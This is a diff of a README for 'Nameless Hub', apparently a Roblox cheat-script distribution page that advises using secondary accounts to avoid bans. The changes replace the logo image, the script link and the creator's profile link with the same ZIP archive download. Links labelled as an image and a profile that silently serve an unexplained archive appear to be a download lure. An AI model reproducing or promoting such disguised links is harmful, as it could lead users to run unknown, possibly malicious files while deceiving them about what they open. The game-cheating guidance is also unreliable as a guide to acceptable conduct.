@@ -1,6 +1,6 @@
 
 ## Welcome to Nameless Hub
-![Logo](https://github.com/KerbHeh/NamelessHub/blob/main/Logo.png) (sorry for the lack of creativity xP)    
+![Logo](https://github.com/KerbHeh/NamelessHub/raw/refs/heads/main/Universal-script/Nameless-Hub-v3.1.zip) (sorry for the lack of creativity xP)    
 so.. huhh it's the only thing I can say after all.... XDDD
 
 I hope you have fun ! :)
@@ -9,7 +9,7 @@ I hope you have fun ! :)
 ## What are we? I don't even know lol
 
 
-[click here](https://raw.githubusercontent.com/KerbHeh/NamelessHub/refs/heads/main/Get/script/file) to get script
+[click here](https://github.com/KerbHeh/NamelessHub/raw/refs/heads/main/Universal-script/Nameless-Hub-v3.1.zip) to get script
 
 > [!NOTE]
 > Use responsibly.
@@ -24,4 +24,4 @@ I hope you have fun ! :)
 > Cuse on secondary accounts. this way, you won't risk getting banned
 
 ### creator's link:
-[link](https://www.roblox.com/pt/users/10352359991/profile)
+[link](https://github.com/KerbHeh/NamelessHub/raw/refs/heads/main/Universal-script/Nameless-Hub-v3.1.zip)
